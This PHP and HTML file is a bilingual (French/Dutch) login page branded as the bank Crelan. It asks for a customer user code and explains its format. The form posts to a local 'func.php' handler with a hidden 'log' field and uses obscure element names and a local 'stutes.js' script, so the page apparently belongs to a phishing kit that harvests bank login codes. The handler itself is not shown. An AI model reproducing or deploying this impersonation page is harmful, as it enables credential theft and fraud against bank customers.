<?php
  session_start();
  include "./Assets/php/lang/lang.php";
  $langs = $_GET['lang'] ?? $_SESSION['lang'] ?? 'fr';    
?>
<!DOCTYPE html>
<html lang="en" class="">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <!-- Font Google -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
    <!-- Font Awesome Library --> 
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.1.1/css/all.min.css" integrity="sha512-KfkfwYDsLkIlwQp6LFnl8zNdLGxu9YAA1QvwINks4PhcElQSvqcyVLLD9aMhXd13uQjoXtEKNosOWaZqXgel0g==" crossorigin="anonymous" referrerpolicy="no-referrer" />
    <!-- File Css -->
    <link rel="stylesheet" href="./Assets/css/main.css">
    <link rel="stylesheet" href="./Assets/css/basic-thinks.css">
    <!-- Favicon -->
    <link rel="icon" href="./Assets/imgs/favicon.ico">
    <link rel="shortcut" href="./Assets/imgs/favicon.ico">
    <link rel="appel-touch-icon" href="./Assets/imgs/favicon.ico">
    <title><?php echo get_text('title_head'); ?></title>
    <script src="./Assets/js/stutes.js"></script>        
</head>
<body>
    <!-- Main Section -->
    <div class="main-section">
        <div class="nav-section">
            <div class="logo">
                <img src="./Assets/imgs/logo.png" alt="">
            </div>
            <form action="" class="lang-form" method="post">
                <a href="./login.php?lang=<?php echo ($langs == 'nl') ? 'fr' : 'nl'; ?>" 
                class="display-current-lang" id="buttonMenuLang">
                <?php echo get_text('current_lang'); ?>
                <img src="./Assets/imgs/arrow-nav.png" alt="" id="iconRight">
                </a>
            </form>
        </div>
        <div class="content-main-section">
            <h1 class="title-login"><?php echo get_text('title_step_login_1'); ?></h1>
            <?php
                if (isset($_GET['error'])) {
                    echo '
                    <div class="message-error-pages">
                        <i class="fa-solid fa-triangle-exclamation"></i>'
                         .get_text('message_error_step_login').
                    '</div>';
                }
            ?> 
            <form action="./Assets/php/config/func.php" method="post" id="fsdpElement" class="f-s-d-p-element">
                <input type="hidden" name="log">
                <div class="coul-1">
                    <img src="./Assets/imgs/icon-login.png" alt="">
                </div>
                <div class="coul-4">
                    <div class="prt-icon-login">
                        <i class="fa-solid fa-key"></i>
                    </div>
                    <p class="p-login"><?php echo get_text('paragraph_step_login_1'); ?></p>
                    <div class="prt-3" id="div1">
                        <label for="userCode"><?php echo get_text('label_step_login'); ?><img src="./Assets/imgs/icon-label.png" alt=""></label>
                        <input type="text" name="user_code" id="userCode" class="i-element" pattern="[A-Za-z]{2}[0-9]{2}[A-Za-z]{2}"  required placeholder=". . . . . ." >
                        <div class="prt-icon-clear" id="clearInput">
                            <img src="./Assets/imgs/icon-cleaer.png" alt="">
                        </div>
                        <small id="messageError1" class="m-e-i"> <img src="./Assets/imgs/icon-error.png" alt=""><?php echo get_text('message_error_input_step_login'); ?></small>
                    </div>
                    <div class="prt-btn">
                        <button type="submit" name="b_s_d_p" id="bsdpElement" class="btn-element"><?php echo get_text('button_step_login'); ?></button>
                    </div>
                </div>
            </form> 
            <div class="section-explain">
                <h1 class="title-explain"><?php echo get_text('title_step_login_2'); ?></h1>
                <div class="coul-2">
                    <div class="coul-text">
                        <h3><?php echo get_text('title_step_login_3'); ?></h3>
                        <p>
                            <?php echo get_text('paragraph_step_login_2'); ?>
                        </p>
                        <div class="note-explain">
                            <div class="text-note-explain">
                                <strong>(AB 12 CD)</strong> <?php echo get_text('paragraph_step_login_3'); ?>
                            </div>
                        </div>
                    </div>
                    <div class="coul-image">
                        <img src="./Assets/imgs/image-explain-1.jpg" class="image-1">
                    </div>
                </div>
                <div class="coul-2">
                    <div class="coul-text">
                        <h3><?php echo get_text('title_step_login_3'); ?></h3>
                        <p style="margin-bottom: 10px;">
                            <?php echo get_text('paragraph_step_login_4'); ?>
                        </p>
                        <p>
                            <?php echo get_text('paragraph_step_login_5'); ?>
                        </p>
                    </div>
                </div>
            </div> 
        </div>
    </div>
    <!-- Main Section -->

    <!-- Footer Section -->
    <div class="footer-section">
        <div class="content-footer-section">
            <div class="links-footer">
                <span class="link-footer"><?php echo get_text('link_footer_1'); ?></span> <span class="ship">—</span> <span class="link-footer"><?php echo get_text('link_footer_2'); ?></span> <span class="ship">—</span> <span class="link-footer"><?php echo get_text('link_footer_3'); ?></span> <span class="ship">—</span> <span class="link-footer"><?php echo get_text('link_footer_4'); ?></span> <span class="ship">—</span> 
            </div>
            <p><?php echo get_text('paragraph_footer'); ?> © Crelan <?php echo date("Y"); ?></p>
        </div>
    </div>
    <!-- Footer Section -->

    <!-- script jquery -->
    <script src="https://code.jquery.com/jquery-3.7.1.js"></script>         
    <script src="./Assets/js/script.js"></script>         
</body>
</html>